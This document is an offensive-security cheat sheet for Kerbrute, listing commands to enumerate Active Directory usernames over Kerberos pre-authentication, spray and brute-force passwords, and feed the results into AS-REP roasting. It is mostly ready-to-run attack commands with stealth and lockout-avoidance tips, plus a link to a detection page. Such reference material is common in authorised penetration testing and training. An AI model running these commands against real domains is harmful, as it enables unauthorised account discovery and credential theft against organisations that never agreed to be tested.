# 🎟️ Kerbrute Cheat Sheet

**Kerbrute** abuses Kerberos pre-authentication to **enumerate valid AD usernames** and **spray passwords** — fast and (relatively) quiet, because failed Kerberos pre-auth often isn't logged as a normal logon failure.

```bash
# General syntax
kerbrute <command> -d <domain> --dc <dc-ip> [options]
```

> 💡 You only need network access to the DC (port 88) and a domain name — **no credentials** required for user enumeration.

---

## Commands

| Command | Example | Description |
| --- | --- | --- |
| `userenum` | `kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt` | Find which usernames exist (valid vs invalid) |
| `passwordspray` | `kerbrute passwordspray -d corp.local --dc 10.10.10.1 users.txt 'Spring2025!'` | Try one password against many users |
| `bruteuser` | `kerbrute bruteuser -d corp.local --dc 10.10.10.1 passwords.txt bob` | Many passwords against one user |
| `bruteforce` | `kerbrute bruteforce -d corp.local --dc 10.10.10.1 combos.txt` | `user:pass` combo list |

## Useful flags

| Flag | Description |
| --- | --- |
| `-d` | Domain (e.g. `corp.local`) |
| `--dc` | Domain controller IP |
| `-o out.txt` | Save results |
| `-t` | Threads |
| `--delay` | Delay between attempts (stealth / avoid lockout) |
| `-v` | Verbose |

> ⚠️ `passwordspray` **can lock accounts**. Check the lockout policy first (`nxc smb --pass-pol`, see [netexec](../netexec)) and use `--delay` + one password per round.

---

## 🧭 Typical workflow

```bash
# 1. Enumerate valid usernames from a name wordlist (no creds needed)
kerbrute userenum -d corp.local --dc 10.10.10.1 \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt

# 2. Spray a single likely password across the valid users
kerbrute passwordspray -d corp.local --dc 10.10.10.1 valid_users.txt 'Welcome1' --delay 100

# 3. Feed valid users into AS-REP roasting (no-preauth accounts)
GetNPUsers.py corp.local/ -usersfile valid_users.txt -no-pass -dc-ip 10.10.10.1
```

> 🔗 Roast/crack what you find with [impacket](../impacket) + [hashcat](../hashcat). Map the domain with [bloodhound](../bloodhound). Detection side → [DETECTION.md → Lateral movement](../DETECTION.md#8-lateral-movement-windowsad).
